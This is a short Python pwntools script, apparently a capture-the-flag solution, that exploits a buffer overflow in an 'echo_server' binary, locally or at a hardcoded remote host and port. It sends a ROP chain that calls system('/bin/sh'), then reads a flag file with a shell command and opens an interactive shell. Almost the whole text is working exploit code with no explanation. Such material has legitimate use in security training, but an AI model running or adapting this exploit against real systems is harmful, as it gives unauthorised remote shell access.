#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './echo_server'
LIBC = ''
HOST = '140.110.112.77'
PORT = 6129

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if LIBC != '':
    libc = ELF( LIBC )

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
else: 
    r = process( BINARY )

pop_rdi_ret = 0x0000000000400923
binsh = 0x00000000004009c0
system_addr = 0x4006cf

r.sendline(b"'"*0x38+p64(pop_rdi_ret) + p64(binsh) + p64(system_addr))
r.sendline('cat /home/`whoami`/flag')
r.interactive()
